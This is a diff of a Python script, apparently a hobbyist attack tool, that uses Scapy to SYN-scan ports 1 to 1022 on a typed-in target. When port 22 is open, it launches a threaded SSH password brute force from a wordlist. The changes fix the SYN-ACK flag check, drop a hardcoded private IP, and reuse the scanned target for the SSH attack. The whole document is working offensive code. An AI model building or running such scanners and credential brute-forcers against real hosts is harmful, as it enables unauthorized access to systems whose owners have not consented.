@@ -9,12 +9,11 @@ timeout_two_sec = 2
 timeout_three_sec = 3
 TCP_SYN_FLAG = 'S'
 TCP_RST_FLAG = 'R'
-
 stop_flag = 0
 
 target = input("Please add target: ")
-target = "192.168.50.134"
 registered_Ports = range(1,1023)
+# registered_Ports = range(1, 100)
 open_ports = []
 
 
@@ -22,7 +21,7 @@ def scan_port(dst_port):
     source_port = RandShort()
     conf.verb = 0
 
-    pkt = IP(dst=target) / TCP(sport=source_port, dport=dst_port, flags=TCP_SYN_FLAG)
+    pkt = IP(dst=target)/TCP(sport=source_port,dport=dst_port,flags=TCP_SYN_FLAG)
     syn_pkt = sr1(pkt, timeout=timeout_half_sec)
 
     if syn_pkt is None:
@@ -30,12 +29,10 @@ def scan_port(dst_port):
     elif not syn_pkt.haslayer(TCP):
         return False
     elif syn_pkt.haslayer(TCP):
-        var = syn_pkt[TCP].flags & 0x10 == 0x10
-
-    pkt = IP(dst=target) / TCP(sport=source_port, dport=dst_port, flags=TCP_RST_FLAG)
-    sr(pkt, timeout=timeout_half_sec)
-
-    return True
+        var = syn_pkt[TCP].flags & 0x12 == 0x12
+        pkt = IP(dst=target)/TCP(sport=source_port,dport=dst_port,flags=TCP_RST_FLAG)
+        sr(pkt, timeout=timeout_half_sec)
+        return var
 
 
 def target_availability_check(scan_host):
@@ -70,45 +67,40 @@ def brut_force(port):
                 t.join()
                 exit()
             password = line.strip()
-            t = threading.Thread(target=ssh_connect, args=(password,port))
+            t = threading.Thread(target=ssh_connect, args=(password, port))
             t.start()
             time.sleep(1)
 
 
 if target_availability_check(target):
+    print("Port scan start")
     for i in registered_Ports:
         status = scan_port(i)
         if status:
-            print("Open port {i}")
+            print(f"Open port {i}")
             open_ports.append(i)
-print(open_ports)
+print(f"List of open ports: {open_ports}")
 print("Scan finished")
-
 
 if 22 in open_ports:
     user_input = input('Do you want to atak ssh (yes/no): ')
     yes_choices = ['yes', 'y']
     no_choices = ['no', 'n']
     if user_input.lower() in yes_choices:
-        host = input('[+] Target Address: ')
+        host = target
         username = input('[+] SSH Username: ')
         input_file = input('[+] Passwords File: ')
         input_file = "pass/" + input_file
         print('\n')
 
-        if os.path.exists(input_file) == False:
+        if not os.path.exists(input_file):
             print('[!!] That File/Path Does Not Exist')
             sys.exit(1)
 
         print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + username + ' * * *')
+        print('\n')
         brut_force(22)
     elif user_input.lower() in no_choices:
         print('user typed no')
     else:
         print('Type yes or no')
-
-
-
-
-
-
